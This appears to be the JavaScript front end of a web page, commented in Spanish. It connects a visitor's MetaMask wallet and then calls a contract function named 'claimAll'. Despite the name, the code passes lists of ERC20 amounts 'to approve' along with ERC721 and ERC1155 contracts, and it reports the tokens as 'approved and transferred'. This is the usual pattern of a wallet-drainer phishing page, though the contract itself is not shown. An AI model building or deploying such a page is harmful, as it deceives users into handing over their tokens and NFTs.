async function connectMetaMask() {
    if (window.ethereum) {
        try {
            // Solicitar acceso a la cuenta del usuario
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // Crear una instancia de Web3
            web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            userAccount = accounts[0];

            // Mostrar estado conectado
            document.getElementById("status").style.display = "block";
            document.getElementById("connectButton").style.display = "none";
        } catch (error) {
            console.error("Error de conexión", error);
        }
    } else {
        alert("MetaMask no está instalado. Por favor, instálalo.");
    }
}

async function claimAllTokens() {
    // Dirección del contrato y ABI
    const contract = new web3.eth.Contract(contractABI, contractAddress);

    try {
        // Llamar a la función 'claimAll' del contrato
        const tokensERC20 = []; // Direcciones de tokens ERC20
        const amounts = []; // Cantidades a aprobar
        const contractsERC721 = []; // Direcciones de contratos ERC721
        const contractsERC1155 = []; // Direcciones de contratos ERC1155

        // Llamar la función claimAll en el contrato
        await contract.methods.claimAll(
            tokensERC20, amounts, contractsERC721, contractsERC1155
        ).send({ from: userAccount });

        alert("Tokens aprobados y transferidos con éxito.");
    } catch (error) {
        console.error("Error en claimAll", error);
        alert("Hubo un problema con la transacción.");
    }
}
